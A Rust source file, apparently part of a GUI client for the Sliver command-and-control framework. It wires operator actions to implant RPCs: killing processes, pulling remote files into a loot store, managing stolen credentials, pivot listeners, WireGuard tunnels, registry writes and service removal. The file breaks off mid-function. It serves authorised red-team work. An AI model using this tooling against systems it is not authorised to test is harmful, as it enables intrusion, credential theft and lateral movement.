//! Extended operator operations: process listing / termination, richer file operations,
//! build management, writable loot/creds, hosts & IOCs, implant-chaining
//! pivot listeners, WireGuard, HTTP C2 profiles, Windows registry/services,
//! multiplayer presence, server administration (certificates, compiler targets,
//! builders, AI conversation history) and implant upkeep (ping,
//! open/close session, environment, chown, WASM extensions). Everything here
//! drives stock Sliver RPCs.

use std::time::Duration;

use super::{gunzip, Rpc, Target, Update};
use crate::proto::{clientpb, commonpb, sliverpb};

/// An extended operation requested by the UI (wrapped in `Command::Op`).
#[derive(Clone, Debug)]
pub enum Op {
    // ---- processes ----
    ProcList { target: Target },
    Terminate { target: Target, pid: i32, force: bool },

    // ---- file system ----
    Cd { target: Target, path: String },
    Pwd { target: Target },
    Cp { target: Target, src: String, dst: String },
    Mv { target: Target, src: String, dst: String },
    Chmod { target: Target, path: String, mode: String, recursive: bool },
    Grep { target: Target, path: String, pattern: String, recursive: bool },
    Mounts { target: Target },
    Preview { target: Target, path: String },
    UploadIoc { target: Target, remote: String, data: Vec<u8> },
    /// Download a remote file straight into the loot store.
    LootRemote { target: Target, path: String },

    // ---- builds ----
    RefreshProfiles,
    SaveProfile { name: String, config: clientpb::ImplantConfig },
    DeleteProfile { name: String },
    RefreshBuilds,
    DeleteBuild { name: String },
    Regenerate { name: String, save_dir: Option<String> },
    RefreshCanaries,
    Reconfigure { target: Target, interval_s: i64, jitter_s: i64 },

    // ---- loot / creds ----
    AddCred(clientpb::Credential),
    UpdateCred(clientpb::Credential),
    RmCreds(Vec<String>),
    AddLoot { name: String, data: Vec<u8>, text: bool },
    RmLoot { id: String },
    LootFetch { id: String, save_to: Option<String> },

    // ---- hosts / IOCs ----
    RefreshHosts,
    /// Host record removal; Sliver may key it by ID or host UUID.
    RmHost { id: String, uuid: String },
    RmIoc { ioc: clientpb::Ioc },

    // ---- implant-chaining pivot listeners ----
    PivotStart { target: Target, named_pipe: bool, bind: String },
    PivotStop { target: Target, id: u32 },
    PivotListeners { target: Target },

    // ---- WireGuard ----
    WgClientConfig { save_to: String, endpoint: String },
    WgSocksStart { target: Target, port: i32 },
    WgSocksStop { target: Target, id: i32 },
    WgFwdStart { target: Target, local_port: i32, remote: String },
    WgFwdStop { target: Target, id: i32 },
    WgList { target: Target },

    // ---- HTTP C2 profiles ----
    RefreshC2Profiles,
    C2ProfileDetail { name: String },
    ImportC2Profile { config: clientpb::Httpc2Config, overwrite: bool },

    // ---- Windows registry / services ----
    RegList { target: Target, hive: String, path: String },
    RegRead { target: Target, hive: String, path: String, key: String },
    RegWrite { target: Target, hive: String, path: String, key: String, value: RegValue },
    RegCreateKey { target: Target, hive: String, path: String, key: String },
    RegDeleteKey { target: Target, hive: String, path: String, key: String },
    Services { target: Target },
    ServiceStart { target: Target, name: String },
    ServiceStop { target: Target, name: String },
    ServiceDetail { target: Target, name: String },
    RemoveService { target: Target, name: String },

    // ---- multiplayer ----
    RefreshOperators,

    // ---- server administration ----
    /// Certificates, CA, compiler targets, external builders and AI providers.
    RefreshServerInfo,
    AiConversations,
    AiConversation { id: String },
    AiDelete { id: String },

    // ---- implant upkeep ----
    Ping { target: Target },
    /// Ask a beacon to open an interactive session over `c2` (its active C2 if empty).
    OpenSession { target: Target, c2: String, delay_s: i64 },
    CloseSession { target: Target },
    RefreshBeacon { id: String },
    SetEnv { target: Target, key: String, value: String },
    UnsetEnv { target: Target, key: String },
    Chown { target: Target, path: String, uid: String, gid: String, recursive: bool },
    RportFwds { target: Target },
    RportFwdStop { target: Target, id: u32 },
    WasmList { target: Target },
    WasmRegister { target: Target, name: String, wasm: Vec<u8> },
    WasmExec { target: Target, name: String, args: Vec<String> },

    // ---- loot / creds / hosted files (in-place edits) ----
    RenameLoot { id: String, name: String },
    CredDetail { id: String },
    CredsByHashType(i32),
    SniffHashType { hash: String },
    ReplaceHostedFile { website: String, path: String, content_type: String, data: Vec<u8>, original_file: String },
    SetHostedContentType { website: String, path: String, content_type: String },
}

impl Op {
    /// One line for the operator activity log: the implant it acts on (None = the
    /// server) and what it does. None for UI refreshes and lookups. Secrets (values
    /// written, credential secrets) are left out.
    pub fn describe(&self) -> Option<(Option<&Target>, String)> {
        let (t, s) = match self {
            Op::ProcList { target } => (Some(target), "ps".to_string()),
            Op::Terminate { target, pid, force } => (Some(target), format!("kill process {pid}{}", if *force { " (force)" } else { "" })),
            Op::Cd { target, path } => (Some(target), format!("cd {path}")),
            Op::Pwd { target } => (Some(target), "pwd".into()),
            Op::Cp { target, src, dst } => (Some(target), format!("cp {src} {dst}")),
            Op::Mv { target, src, dst } => (Some(target), format!("mv {src} {dst}")),
            Op::Chmod { target, path, mode, recursive } => (Some(target), format!("chmod {}{mode} {path}", if *recursive { "-R " } else { "" })),
            Op::Chown { target, path, uid, gid, recursive } => (Some(target), format!("chown {}{uid}:{gid} {path}", if *recursive { "-R " } else { "" })),
            Op::Grep { target, path, pattern, .. } => (Some(target), format!("grep {pattern} {path}")),
            Op::Mounts { target } => (Some(target), "mounts".into()),
            Op::Preview { target, path } => (Some(target), format!("read {path}")),
            Op::UploadIoc { target, remote, data } => (Some(target), format!("upload {remote} ({} bytes, IOC)", data.len())),
            Op::LootRemote { target, path } => (Some(target), format!("download {path} → loot")),
            Op::Reconfigure { target, interval_s, jitter_s } => (Some(target), format!("reconfigure beacon {interval_s}s ± {jitter_s}s")),
            Op::PivotStart { target, named_pipe, bind } => (Some(target), format!("start {} pivot listener {bind}", if *named_pipe { "named-pipe" } else { "TCP" })),
            Op::PivotStop { target, id } => (Some(target), format!("stop pivot listener {id}")),
            Op::WgSocksStart { target, port } => (Some(target), format!("WireGuard SOCKS on {port}")),
            Op::WgSocksStop { target, id } => (Some(target), format!("stop WireGuard SOCKS {id}")),
            Op::WgFwdStart { target, local_port, remote } => (Some(target), format!("WireGuard port-forward {local_port} → {remote}")),
            Op::WgFwdStop { target, id } => (Some(target), format!("stop WireGuard port-forward {id}")),
            Op::RegList { target, hive, path } => (Some(target), format!("reg list {hive}\\{path}")),
            Op::RegRead { target, hive, path, key } => (Some(target), format!("reg read {hive}\\{path}\\{key}")),
            Op::RegWrite { target, hive, path, key, .. } => (Some(target), format!("reg write {hive}\\{path}\\{key}")),
            Op::RegCreateKey { target, hive, path, key } => (Some(target), format!("reg create key {hive}\\{path}\\{key}")),
            Op::RegDeleteKey { target, hive, path, key } => (Some(target), format!("reg delete key {hive}\\{path}\\{key}")),
            Op::Services { target } => (Some(target), "list services".into()),
            Op::ServiceStart { target, name } => (Some(target), format!("start service {name}")),
            Op::ServiceStop { target, name } => (Some(target), format!("stop service {name}")),
            Op::ServiceDetail { target, name } => (Some(target), format!("service details {name}")),
            Op::RemoveService { target, name } => (Some(target), format!("remove service {name}")),
            Op::Ping { target } => (Some(target), "ping".into()),
            Op::OpenSession { target, c2, .. } => (Some(target), format!("open interactive session over {c2}")),
            Op::CloseSession { target } => (Some(target), "close session".into()),
            Op::SetEnv { target, key, .. } => (Some(target), format!("setenv {key}")),
            Op::UnsetEnv { target, key } => (Some(target), format!("unsetenv {key}")),
            Op::RportFwdStop { target, id } => (Some(target), format!("stop reverse port-forward {id}")),
            Op::WasmRegister { target, name, wasm } => (Some(target), format!("register WASM extension {name} ({} bytes)", wasm.len())),
            Op::WasmExec { target, name, args } => (Some(target), format!("wasm {name} {}", args.join(" ")).trim_end().to_string()),
            Op::SaveProfile { name, .. } => (None, format!("save implant profile {name}")),
            Op::DeleteProfile { name } => (None, format!("delete implant profile {name}")),
            Op::DeleteBuild { name } => (None, format!("delete build {name}")),
            Op::Regenerate { name, .. } => (None, format!("re-download build {name}")),
            Op::AddCred(c) => (None, format!("add credential for {}", c.username)),
            Op::UpdateCred(c) => (None, format!("edit credential for {}", c.username)),
            Op::RmCreds(ids) => (None, format!("remove {} credential(s)", ids.len())),
            Op::AddLoot { name, data, .. } => (None, format!("add loot {name} ({} bytes)", data.len())),
            Op::RmLoot { id } => (None, format!("remove loot {}", super::short_id(id))),
            Op::RenameLoot { name, .. } => (None, format!("rename loot → {name}")),
            Op::RmHost { uuid, .. } => (None, format!("remove host record {}", super::short_id(uuid))),
            Op::RmIoc { ioc } => (None, format!("clear IOC {}", ioc.path)),
            Op::ImportC2Profile { config, .. } => (None, format!("import HTTP C2 profile {}", config.name)),
            Op::WgClientConfig { save_to, .. } => (None, format!("export WireGuard client config → {save_to}")),
            Op::AiDelete { id } => (None, format!("delete AI conversation {}", super::short_id(id))),
            Op::ReplaceHostedFile { website, path, data, .. } => (None, format!("replace hosted file {website}{path} ({} bytes)", data.len())),
            Op::SetHostedContentType { website, path, content_type } => (None, format!("set {website}{path} content type {content_type}")),
            _ => return None,
        };
        Some((t, s))
    }
}

/// A registry value to write.
#[derive(Clone, Debug)]
pub enum RegValue {
    String(String),
    Dword(u32),
}

/// Results of extended operations (wrapped in `Update::Op`).
#[derive(Clone, Debug)]
pub enum OpUpdate {
    Processes { target: String, procs: Vec<commonpb::Process> },
    Cwd { target: String, path: String },
    Grep { target: String, pattern: String, root: String, hits: Vec<GrepHit> },
    Mounts { target: String, mounts: Vec<sliverpb::MountInfo> },
    Preview { target: String, path: String, data: Vec<u8> },
    Profiles(Vec<clientpb::ImplantProfile>),
    Builds(Vec<BuildInfo>),
    Canaries(Vec<clientpb::DnsCanary>),
    LootContent { id: String, name: String, data: Vec<u8> },
    Hosts(Vec<clientpb::Host>),
    PivotListeners { target: String, listeners: Vec<sliverpb::PivotListener> },
    WgList { target: String, socks: Vec<sliverpb::WgSocksServer>, fwds: Vec<sliverpb::WgtcpForwarder> },
    C2Profiles(Vec<String>),
    C2Profile(Box<clientpb::Httpc2Config>),
    Registry { target: String, hive: String, path: String, subkeys: Vec<String>, values: Vec<String> },
    RegValue { target: String, key: String, value: String },
    Services { target: String, services: Vec<sliverpb::ServiceDetails> },
    ServiceDetail { target: String, detail: sliverpb::ServiceDetails },
    Operators(Vec<clientpb::Operator>),
    ServerInfo(Box<ServerInfo>),
    AiConversations(Vec<clientpb::AiConversation>),
    AiConversation(Box<clientpb::AiConversation>),
    Beacon(Box<clientpb::Beacon>),
    RportFwds { target: String, listeners: Vec<sliverpb::RportFwdListener> },
    WasmExtensions { target: String, names: Vec<String> },
    CredDetail(clientpb::Credential),
    /// Credential IDs of one hash type (the Creds tab's type filter).
    CredsOfType { hash_type: i32, ids: Vec<String> },
    SniffedHashType { hash: String, hash_type: i32 },
}

/// Server-side facts for the Server tab. Each part is fetched separately;
/// a failure leaves its part empty and records why in `errors`.
#[derive(Clone, Debug, Default)]
pub struct ServerInfo {
    pub ca: Vec<clientpb::CertificateAuthorityData>,
    pub certs: Vec<clientpb::CertificateData>,
    pub compiler: Option<clientpb::Compiler>,
    pub builders: Vec<clientpb::Builder>,
    pub ai_providers: Vec<clientpb::AiProviderConfig>,
    pub errors: Vec<String>,
}

/// One grep match, flattened for display.
#[derive(Clone, Debug)]
pub struct GrepHit {
    pub file: String,
    pub line_no: i64,
    pub line: String,
}

/// An implant build from the server's build history.
#[derive(Clone, Debug)]
pub struct BuildInfo {
    pub name: String,
    pub os: String,
    pub arch: String,
    pub format: i32,
    pub beacon: bool,
    pub c2: Vec<String>,
    pub staged: bool,
}

/// The implant's error string, if a response carries one.
fn resp_err(r: &Option<commonpb::Response>) -> Option<String> {
    r.as_ref().map(|x| x.err.clone()).filter(|e| !e.is_empty())
}

pub(super) async fn run(
    op: Op,
    c: &mut Rpc,
    upd_tx: &crossbeam_channel::Sender<Update>,
    ctx: &egui::Context,
) {
    macro_rules! push {
        ($u:expr) => {{ let _ = upd_tx.send($u); ctx.request_repaint(); }};
    }
    macro_rules! op {
        ($u:expr) => { push!(Update::Op($u)) };
    }
    macro_rules! notice {
        ($ok:expr, $($t:tt)*) => { push!(Update::Notice { ok: $ok, text: format!($($t)*) }) };
    }
    // Unwrap a gRPC result, reporting failures as a notice.
    macro_rules! tryrpc {
        ($what:expr, $call:expr) => {
            match $call.await {
                Ok(r) => r.into_inner(),
                Err(e) => { notice!(false, "{}: {}", $what, e.message()); return; }
            }
        };
    }

    match op {
        // ------------------------------------------------------------ processes
        Op::ProcList { target } => {
            let ps = tryrpc!("ps", c.ps(sliverpb::PsReq { full_info: true, request: Some(target.request(60)) }));
            if let Some(e) = resp_err(&ps.response) { notice!(false, "ps: {e}"); return; }
            op!(OpUpdate::Processes { target: target.key(), procs: ps.processes });
        }
        Op::Terminate { target, pid, force } => {
            let r = tryrpc!("kill process", c.terminate(sliverpb::TerminateReq { pid, force, request: Some(target.request(30)) }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "kill pid {pid}: {e}"),
                None => {
                    notice!(true, "terminated pid {pid}");
                    if let Ok(ps) = c.ps(sliverpb::PsReq { full_info: true, request: Some(target.request(60)) }).await {
                        op!(OpUpdate::Processes { target: target.key(), procs: ps.into_inner().processes });
                    }
                }
            }
        }

        // ------------------------------------------------------------ files
        Op::Cd { target, path } => {
            let r = tryrpc!("cd", c.cd(sliverpb::CdReq { path, request: Some(target.request(30)) }));
            if let Some(e) = resp_err(&r.response) { notice!(false, "cd: {e}"); return; }
            op!(OpUpdate::Cwd { target: target.key(), path: r.path });
        }
        Op::Pwd { target } => {
            let r = tryrpc!("pwd", c.pwd(sliverpb::PwdReq { request: Some(target.request(30)) }));
            if let Some(e) = resp_err(&r.response) { notice!(false, "pwd: {e}"); return; }
            op!(OpUpdate::Cwd { target: target.key(), path: r.path });
        }
        Op::Cp { target, src, dst } => {
            let r = tryrpc!("cp", c.cp(sliverpb::CpReq { src: src.clone(), dst: dst.clone(), request: Some(target.request(120)) }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "cp: {e}"),
                None => notice!(true, "copied {src} → {dst}"),
            }
        }
        Op::Mv { target, src, dst } => {
            let r = tryrpc!("mv", c.mv(sliverpb::MvReq { src: src.clone(), dst: dst.clone(), request: Some(target.request(60)) }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "mv: {e}"),
                None => notice!(true, "moved {src} → {dst}"),
            }
        }
        Op::Chmod { target, path, mode, recursive } => {
            let r = tryrpc!("chmod", c.chmod(sliverpb::ChmodReq { path: path.clone(), file_mode: mode.clone(), recursive, request: Some(target.request(60)) }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "chmod: {e}"),
                None => notice!(true, "chmod {mode} {path}"),
            }
        }
        Op::Grep { target, path, pattern, recursive } => {
            let r = tryrpc!("grep", c.grep(sliverpb::GrepReq {
                search_pattern: pattern.clone(), path, recursive, lines_before: 0, lines_after: 0,
                request: Some(target.request(120)),
            }));
            if let Some(e) = resp_err(&r.response) { notice!(false, "grep: {e}"); return; }
            let mut hits = Vec::new();
            for (file, res) in &r.results {
                if res.is_binary {
                    hits.push(GrepHit { file: file.clone(), line_no: 0, line: "(binary file matches)".into() });
                    continue;
                }
                for fr in &res.file_results {
                    hits.push(GrepHit { file: file.clone(), line_no: fr.line_number, line: fr.line.clone() });
                }
            }
            hits.sort_by(|a, b| a.file.cmp(&b.file).then(a.line_no.cmp(&b.line_no)));
            op!(OpUpdate::Grep { target: target.key(), pattern, root: r.search_path_absolute, hits });
        }
        Op::Mounts { target } => {
            let r = tryrpc!("mounts", c.mount(sliverpb::MountReq { request: Some(target.request(30)) }));
            if let Some(e) = resp_err(&r.response) { notice!(false, "mounts: {e}"); return; }
            op!(OpUpdate::Mounts { target: target.key(), mounts: r.info });
        }
        Op::Preview { target, path } => {
            let r = tryrpc!("preview", c.download(sliverpb::DownloadReq { path: path.clone(), request: Some(target.request(60)), ..Default::default() }));
            if let Some(e) = resp_err(&r.response) { notice!(false, "preview: {e}"); return; }
            let data = if r.encoder == "gzip" { gunzip(&r.data) } else { r.data };
            op!(OpUpdate::Preview { target: target.key(), path, data });
        }
        Op::LootRemote { target, path } => {
            let r = tryrpc!("download", c.download(sliverpb::DownloadReq { path: path.clone(), request: Some(target.request(120)), ..Default::default() }));
            if let Some(e) = resp_err(&r.response) { notice!(false, "download {path}: {e}"); return; }
            let data = if r.encoder == "gzip" { gunzip(&r.data) } else { r.data };
            let name = path.rsplit(['/', '\\']).next().unwrap_or("file").to_string();
            let text = std::str::from_utf8(&data).is_ok();
            add_loot(c, name, data, text, upd_tx, ctx).await;
        }
        Op::UploadIoc { target, remote, data } => {
            let req = sliverpb::UploadReq { path: remote.clone(), data, is_ioc: true, request: Some(target.request(120)), ..Default::default() };
            match c.upload(req).await {
                Ok(r) => match resp_err(&r.into_inner().response) {
                    Some(e) => notice!(false, "upload: {e}"),
                    None => notice!(true, "uploaded → {remote} (tracked as IOC)"),
                },
                Err(e) => notice!(false, "upload: {}", e.message()),
            }
        }

        // ------------------------------------------------------------ builds
        Op::RefreshProfiles => {
            let r = tryrpc!("implant profiles", c.implant_profiles(commonpb::Empty {}));
            op!(OpUpdate::Profiles(r.profiles));
        }
        Op::SaveProfile { name, config } => {
            let p = clientpb::ImplantProfile { id: String::new(), name: name.clone(), config: Some(config) };
            tryrpc!("save profile", c.save_implant_profile(p));
            notice!(true, "saved implant profile '{name}'");
            if let Ok(r) = c.implant_profiles(commonpb::Empty {}).await { op!(OpUpdate::Profiles(r.into_inner().profiles)); }
        }
        Op::DeleteProfile { name } => {
            tryrpc!("delete profile", c.delete_implant_profile(clientpb::DeleteReq { name: name.clone() }));
            notice!(true, "deleted profile '{name}'");
            if let Ok(r) = c.implant_profiles(commonpb::Empty {}).await { op!(OpUpdate::Profiles(r.into_inner().profiles)); }
        }
        Op::RefreshBuilds => {
            let r = tryrpc!("implant builds", c.implant_builds(commonpb::Empty {}));
            op!(OpUpdate::Builds(builds_list(r)));
        }
        Op::DeleteBuild { name } => {
            tryrpc!("delete build", c.delete_implant_build(clientpb::DeleteReq { name: name.clone() }));
            notice!(true, "deleted build '{name}'");
            if let Ok(r) = c.implant_builds(commonpb::Empty {}).await { op!(OpUpdate::Builds(builds_list(r.into_inner()))); }
        }
        Op::Regenerate { name, save_dir } => {
            let r = match c.regenerate(clientpb::RegenerateReq { implant_name: name.clone() }).await {
                Ok(r) => r.into_inner(),
                Err(e) => { push!(Update::GenerateDone { name, path: String::new(), ok: false, msg: e.message().into() }); return; }
            };
            push!(super::deliver_build(name, r.file, save_dir.as_deref()));
        }
        Op::RefreshCanaries => {
            let r = tryrpc!("canaries", c.canaries(commonpb::Empty {}));
            op!(OpUpdate::Canaries(r.canaries));
        }
        Op::Reconfigure { target, interval_s, jitter_s } => {
            const NS: i64 = 1_000_000_000;
            let r = tryrpc!("reconfigure", c.reconfigure(sliverpb::ReconfigureReq {
                beacon_interval: interval_s * NS, beacon_jitter: jitter_s * NS, request: Some(target.request(60)), ..Default::default()
            }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "reconfigure: {e}"),
                None => notice!(true, "beacon reconfigure queued: every {interval_s}s ± {jitter_s}s (applies at next check-in)"),
            }
        }

        // ------------------------------------------------------------ loot / creds
        Op::AddCred(cred) => {
            tryrpc!("add credential", c.creds_add(clientpb::Credentials { credentials: vec![cred] }));
            notice!(true, "credential added");
            refresh_creds(c, upd_tx, ctx).await;
        }
        Op::UpdateCred(cred) => {
            tryrpc!("update credential", c.creds_update(clientpb::Credentials { credentials: vec![cred] }));
            notice!(true, "credential updated");
            refresh_creds(c, upd_tx, ctx).await;
        }
        Op::RmCreds(ids) => {
            let n = ids.len();
            let creds = ids.into_iter().map(|id| clientpb::Credential { id, ..Default::default() }).collect();
            tryrpc!("remove credentials", c.creds_rm(clientpb::Credentials { credentials: creds }));
            notice!(true, "removed {n} credential(s)");
            refresh_creds(c, upd_tx, ctx).await;
        }
        Op::AddLoot { name, data, text } => add_loot(c, name, data, text, upd_tx, ctx).await,
        Op::RmLoot { id } => {
            tryrpc!("remove loot", c.loot_rm(clientpb::Loot { id, ..Default::default() }));
            notice!(true, "loot removed");
            if let Ok(r) = c.loot_all(commonpb::Empty {}).await { push!(Update::Loot(r.into_inner().loot)); }
        }
        Op::LootFetch { id, save_to } => {
            let l = tryrpc!("loot content", c.loot_content(clientpb::Loot { id: id.clone(), ..Default::default() }));
            let data = l.file.map(|f| f.data).unwrap_or_default();
            if let Some(path) = save_to {
                match std::fs::write(&path, &data) {
                    Ok(_) => notice!(true, "saved loot '{}' → {path} ({} bytes)", l.name, data.len()),
                    Err(e) => notice!(false, "save loot: {e}"),
                }
            } else {
                op!(OpUpdate::LootContent { id, name: l.name, data });
            }
        }

        // ------------------------------------------------------------ hosts / IOCs
        Op::RefreshHosts => {
            let r = tryrpc!("hosts", c.hosts(commonpb::Empty {}));
            op!(OpUpdate::Hosts(r.hosts));
        }
        Op::RmHost { id, uuid } => {
            tryrpc!("remove host", c.host_rm(clientpb::Host { id, host_uuid: uuid, ..Default::default() }));
            notice!(true, "host record removed");
            if let Ok(r) = c.hosts(commonpb::Empty {}).await { op!(OpUpdate::Hosts(r.into_inner().hosts)); }
        }
        Op::RmIoc { ioc } => {
            let path = ioc.path.clone();
            tryrpc!("remove IOC", c.host_ioc_rm(ioc));
            notice!(true, "IOC cleared: {path}");
            if let Ok(r) = c.hosts(commonpb::Empty {}).await { op!(OpUpdate::Hosts(r.into_inner().hosts)); }
        }

        // ------------------------------------------------------------ pivot listeners
        Op::PivotStart { target, named_pipe, bind } => {
            let kind = if named_pipe { sliverpb::PivotType::NamedPipe } else { sliverpb::PivotType::Tcp };
            let r = tryrpc!("pivot listener", c.pivot_start_listener(sliverpb::PivotStartListenerReq {
                r#type: kind as i32, bind_address: bind.clone(), options: Vec::new(), request: Some(target.request(30)),
            }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "pivot listener: {e}"),
                None => notice!(true, "{} pivot listener {} started (id {})", if named_pipe { "named-pipe" } else { "TCP" }, r.bind_address, r.id),
            }
            pivot_listeners(c, &target, upd_tx, ctx).await;
        }
        Op::PivotStop { target, id } => {
            tryrpc!("stop pivot listener", c.pivot_stop_listener(sliverpb::PivotStopListenerReq { id, request: Some(target.request(30)) }));
            notice!(true, "pivot listener {id} stopped");
            pivot_listeners(c, &target, upd_tx, ctx).await;
        }
        Op::PivotListeners { target } => pivot_listeners(c, &target, upd_tx, ctx).await,

        // ------------------------------------------------------------ WireGuard
        Op::WgClientConfig { save_to, endpoint } => {
            let w = tryrpc!("wg client config", c.generate_wg_client_config(commonpb::Empty {}));
            let conf = format!(
                "[Interface]\nAddress = {}/16\nListenPort = 51902\nPrivateKey = {}\nMTU = 1420\n\n[Peer]\nPublicKey = {}\nAllowedIPs = 100.64.0.0/16\nEndpoint = {endpoint}\n",
                w.client_ip, w.client_private_key, w.server_pub_key,
            );
            match std::fs::write(&save_to, conf) {
                Ok(_) => notice!(true, "WireGuard client config ({}) → {save_to}", w.client_ip),
                Err(e) => notice!(false, "save wg config: {e}"),
            }
        }
        Op::WgSocksStart { target, port } => {
            let r = tryrpc!("wg socks", c.wg_start_socks(sliverpb::WgSocksStartReq { port, request: Some(target.request(30)) }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "wg socks: {e}"),
                None => notice!(true, "WireGuard SOCKS5 on {}", r.server.map(|s| s.local_addr).unwrap_or_default()),
            }
            wg_list(c, &target, upd_tx, ctx).await;
        }
        Op::WgSocksStop { target, id } => {
            tryrpc!("stop wg socks", c.wg_stop_socks(sliverpb::WgSocksStopReq { id, request: Some(target.request(30)) }));
            wg_list(c, &target, upd_tx, ctx).await;
        }
        Op::WgFwdStart { target, local_port, remote } => {
            let r = tryrpc!("wg portfwd", c.wg_start_port_forward(sliverpb::WgPortForwardStartReq { local_port, remote_address: remote.clone(), request: Some(target.request(30)) }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "wg portfwd: {e}"),
                None => notice!(true, "WireGuard port-forward :{local_port} → {remote}"),
            }
            wg_list(c, &target, upd_tx, ctx).await;
        }
        Op::WgFwdStop { target, id } => {
            tryrpc!("stop wg portfwd", c.wg_stop_port_forward(sliverpb::WgPortForwardStopReq { id, request: Some(target.request(30)) }));
            wg_list(c, &target, upd_tx, ctx).await;
        }
        Op::WgList { target } => wg_list(c, &target, upd_tx, ctx).await,

        // ------------------------------------------------------------ HTTP C2 profiles
        Op::RefreshC2Profiles => {
            let r = tryrpc!("C2 profiles", c.get_httpc2_profiles(commonpb::Empty {}));
            let mut names: Vec<String> = r.configs.into_iter().map(|p| p.name).collect();
            names.sort();
            op!(OpUpdate::C2Profiles(names));
        }
        Op::C2ProfileDetail { name } => {
            let p = tryrpc!("C2 profile", c.get_httpc2_profile_by_name(clientpb::C2ProfileReq { name }));
            op!(OpUpdate::C2Profile(Box::new(p)));
        }
        Op::ImportC2Profile { config, overwrite } => {
            let name = config.name.clone();
            tryrpc!("import C2 profile", c.save_httpc2_profile(clientpb::Httpc2ConfigReq { overwrite, c2_config: Some(config) }));
            notice!(true, "imported HTTP C2 profile '{name}'");
            if let Ok(r) = c.get_httpc2_profiles(commonpb::Empty {}).await {
                let mut names: Vec<String> = r.into_inner().configs.into_iter().map(|p| p.name).collect();
                names.sort();
                op!(OpUpdate::C2Profiles(names));
            }
        }

        // ------------------------------------------------------------ registry
        Op::RegList { target, hive, path } => reg_list(c, &target, hive, path, upd_tx, ctx).await,
        Op::RegRead { target, hive, path, key } => {
            let r = tryrpc!("registry read", c.registry_read(sliverpb::RegistryReadReq {
                hive, path, key: key.clone(), hostname: String::new(), request: Some(target.request(30)),
            }));
            let value = match resp_err(&r.response) {
                Some(e) => format!("error: {e}"),
                None if !r.binary.is_empty() => hex_preview(&r.binary),
                None => r.value,
            };
            op!(OpUpdate::RegValue { target: target.key(), key, value });
        }
        Op::RegWrite { target, hive, path, key, value } => {
            // Sliver registry value types: 1 = string, 3 = DWORD.
            let mut req = sliverpb::RegistryWriteReq {
                hive: hive.clone(), path: path.clone(), key: key.clone(), request: Some(target.request(30)), ..Default::default()
            };
            match value {
                RegValue::String(s) => { req.string_value = s; req.r#type = 1; }
                RegValue::Dword(d) => { req.d_word_value = d; req.r#type = 3; }
            }
            let r = tryrpc!("registry write", c.registry_write(req));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "registry write: {e}"),
                None => notice!(true, "wrote {hive}\\{path}\\{key}"),
            }
            reg_list(c, &target, hive, path, upd_tx, ctx).await;
        }
        Op::RegCreateKey { target, hive, path, key } => {
            let r = tryrpc!("create key", c.registry_create_key(sliverpb::RegistryCreateKeyReq {
                hive: hive.clone(), path: path.clone(), key: key.clone(), hostname: String::new(), request: Some(target.request(30)),
            }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "create key: {e}"),
                None => notice!(true, "created key {hive}\\{path}\\{key}"),
            }
            reg_list(c, &target, hive, path, upd_tx, ctx).await;
        }
        Op::RegDeleteKey { target, hive, path, key } => {
            let r = tryrpc!("delete key", c.registry_delete_key(sliverpb::RegistryDeleteKeyReq {
                hive: hive.clone(), path: path.clone(), key: key.clone(), hostname: String::new(), request: Some(target.request(30)),
            }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "delete key: {e}"),
                None => notice!(true, "deleted {hive}\\{path}\\{key}"),
            }
            reg_list(c, &target, hive, path, upd_tx, ctx).await;
        }

        // ------------------------------------------------------------ services
        Op::Services { target } => services(c, &target, upd_tx, ctx).await,
        Op::ServiceStart { target, name } => {
            let r = tryrpc!("start service", c.start_service_by_name(sliverpb::StartServiceByNameReq {
                service_info: Some(sliverpb::ServiceInfoReq { service_name: name.clone(), hostname: String::new() }),
                request: Some(target.request(60)),
            }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "start {name}: {e}"),
                None => notice!(true, "started service {name}"),
            }
            services(c, &target, upd_tx, ctx).await;
        }
        Op::ServiceStop { target, name } => {
            let r = tryrpc!("stop service", c.stop_service(sliverpb::StopServiceReq {
                service_info: Some(sliverpb::ServiceInfoReq { service_name: name.clone(), hostname: String::new() }),
                request: Some(target.request(60)),
            }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "stop {name}: {e}"),
                None => notice!(true, "stopped service {name}"),
            }
            services(c, &target, upd_tx, ctx).await;
        }

        Op::ServiceDetail { target, name } => {
            let r = tryrpc!("service detail", c.service_detail(sliverpb::ServiceDetailReq {
                service_info: Some(sliverpb::ServiceInfoReq { service_name: name.clone(), hostname: String::new() }),
                request: Some(target.request(60)),
            }));
            if let Some(e) = resp_err(&r.response) { notice!(false, "service {name}: {e}"); return; }
            match r.detail {
                Some(detail) => op!(OpUpdate::ServiceDetail { target: target.key(), detail }),
                None => notice!(false, "service {name}: {}", if r.message.is_empty() { "no details returned" } else { &r.message }),
            }
        }
        Op::RemoveService { target, name } => {
            let r = tryrpc!("remove service", c.remove_service(sliverpb::RemoveServiceReq {
                service_info: Some(sliverpb::ServiceInfoReq { service_name: name.clone(), hostname: String::new() }),
                request: Some(target.request(60)),
            }));
            match resp_err(&r.response) {
                Some(e) => notice!(false, "remove {name}: {e}"),
                None => notice!(true, "removed service {name}"),
            }
            services(c, &target, upd_tx, ctx).await;
        }

        // ------------------------------------------------------------ operators
        Op::RefreshOperators => {
            if let Ok(r) = c.get_operators(commonpb::Empty {}).await {
                op!(OpUpdate::Operators(r.into_inner().operators));
            }
        }

        // ------------------------------------------------------------ server administration
        Op::RefreshServerInfo => {
            let mut info = ServerInfo::default();
            match c.get_certificate_authority_info(commonpb::Empty {}).await {
                Ok(r) => info.ca = r.into_inner().info,
                Err(e) => info.errors.push(format!("CA info: {}", e.message())),
            }
            match c.get_certificate_info(clientpb::CertificatesReq::default()).await {
                Ok(r) => info.certs = r.into_inner().info,
                Err(e) => info.errors.push(format!("certificates: {}", e.message())),
            }
            match c.get_compiler(commonpb::Empty {}).await {
                Ok(r) => info.compiler = Some(r.into_inner()),
                Err(e) => info.errors.push(format!("compiler: {}", e.message())),
            }
            match c.builders(commonpb::Empty {}).await {
